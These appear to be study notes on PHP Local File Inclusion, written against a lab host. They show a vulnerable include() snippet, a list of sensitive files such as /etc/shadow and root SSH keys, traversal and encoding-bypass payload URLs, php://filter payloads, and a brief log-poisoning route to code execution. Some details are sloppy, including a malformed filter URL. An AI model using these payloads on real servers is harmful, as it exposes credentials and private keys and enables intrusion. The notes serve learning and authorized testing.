In PHP these functions cause LFI vuln : include,  require, include_once , require_once
It is a web application vulnerability that allows the attacker to include and read local files on the server
LFI vulnerability will exist as a developer should never trust user input and keep all inputs from users to be filtered and sanitized
some cases, an LFI vulnerability could be chained to perform Remote Code Execution RCE on the server
Identifying and testing for LFI
    attackers are interested in HTTP parameters to manipulate the input and inject attack payloads to see how the web application behaves
    entry point could be HTTP GET  or POST  parameters that pass an argument or data 
Parameters:
            HTTP://website.com/get.php?file=read.PDF
              protocl = http  
              Doomain Name = website.cim
              File Name = get.php
              Query Strings = ?
              Parameters = file= 

Ex... parameters are used with Google searching, where 'GET' requests pass user input into the search engine. https://www.google.com/search?q=xbox

------------------------------------------------------
Ex... of PHP code vuln to LFI 
        <?PHP 
          	include($_GET["file"]);
        ?>
The PHP code above uses a GET request via the URL parameter file to include the file on the page. The request can be made by sending the following 
    HTTP request: http://example.thm.labs/index.php?file=welcome.txt to load the content of the welcome.txt file that exists in the same directory                      
Now that we found our entry point, let's start testing for reading local files related to the operating system. The following are some Linux system files 
    that have sensitive information.
                                                          /etc/issue    = contains a message or system identification to be printed before the login prompt.
                                                          /etc/passwd   = has all registered user that has access to a system
                                                          /etc/profile  = controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
                                                          /etc/shadow   = contains information about the system's users' passwords
                                                          /etc/group
                                                          /var/mail/root = all emails for root user
                                                          /root/.ssh/id_rsa = Private SSH keys for a root or any known valid user on the server
                                                          /var/log/apache2/access.log  = the accessed requests for Apache  webserver
                                                          C:\boot.ini  =  contains the boot options for computers with BIOS firmware
                                                          /var/log/dmessage = contains global system messages, including the messages that are logged during system startup
                                                          /root/.bash_history = contains the history commands for root user
                                                          /var/log/dmessage = contains global system messages, including the messages that are logged during system startup
                                                          /etc/hosts
                                                          /etc/motd
                                                          /etc/mysql/my.cnf
                                                          /proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
                                                          /proc/self/environ
                                                          /proc/version = specifies the version of the Linux kernel
                                                          /proc/cmdline
try to include using different techniques such as:
                            A direct file inclusion, which starts with /etc/passwd
                            using .. to get out the current directory, the number of .. is varies depending on the web app directory. 
                            Bypassing filters using ....//.
                            URL encoding techniques (such as double encoding)
-------                            
  http://example.thm.labs/page.php?file=/etc/passwd 
  http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
  http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
  http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
  http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd

PHP Filter

The PHP filter wrapper is used in LFI to read the actual PHP page content. In typical cases, it is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code
However, we can use the PHP filter to display the content of PHP files in other encoding formats such as base64 or ROT13
http://example.thm.labs/page.php?file=filter/read=string.rot13/resource=/etc/passwd 
http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

he User-Agent is one of the HTTP headers that the user can control. Therefore, in order to get the RCE, you need to include PHP code into User-Agent and send a request to the log file using the LFI to execute in the browser.














  
